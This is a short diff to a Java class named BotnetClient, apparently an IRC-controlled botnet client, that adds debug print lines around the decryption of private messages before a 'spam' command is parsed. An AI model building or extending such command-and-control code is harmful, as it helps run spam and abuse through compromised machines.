@@ -96,7 +96,9 @@ public class BotnetClient extends PircBot {
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
 		try {
 			// TODO: maybe need to put this back
+			System.out.println(message);
 			message = startMsgE.decryptMsg(message);
+			System.out.println(message);
 			if (message.toLowerCase().startsWith("spam")) {
 				String[] parts = message.split(" ");
 				if (parts.length < 8) {
